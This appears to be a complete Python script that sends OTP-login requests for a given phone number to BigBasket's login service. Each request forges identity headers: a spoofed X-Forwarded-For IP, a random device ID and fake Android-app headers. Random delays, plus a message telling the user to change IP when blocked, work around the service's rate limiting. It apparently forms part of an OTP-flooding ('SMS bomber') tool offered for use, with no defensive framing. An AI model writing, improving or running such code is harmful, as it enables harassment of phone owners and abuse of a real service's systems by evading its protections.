import requests
import time
import random
import uuid

class BBB_Smart_Session:
    def __init__(self):
        self.session = requests.Session()

    def get_headers(self):
        fake_ip = f"106.2{random.randint(10,22)}.{random.randint(0,255)}.{random.randint(0,255)}"
        return {
            'Host': 'www.bigbasket.com',
            'X-Channel': 'BB-Android',
            'X-App-Version': '11.6.0',
            'X-Device-Id': str(uuid.uuid4()),
            'X-Forwarded-For': fake_ip,
            'User-Agent': 'okhttp/4.9.2',
            'Content-Type': 'application/json'
        }

    def request_otp(self, phone):
        if not phone: return "❌ Number dalo!"
        time.sleep(random.uniform(5, 8)) 
        try:
            res = self.session.post(
                "https://www.bigbasket.com/svc/member/v2/otp-login/",
                json={"mobile_number": phone[-10:]},
                headers=self.get_headers(),
                timeout=20
            )
            if res.status_code == 200:
                return "✅ OTP SUCCESS!"
            return f"❌ Blocked (403). Render IP badlo."
        except:
            return "❌ Connection Fail."
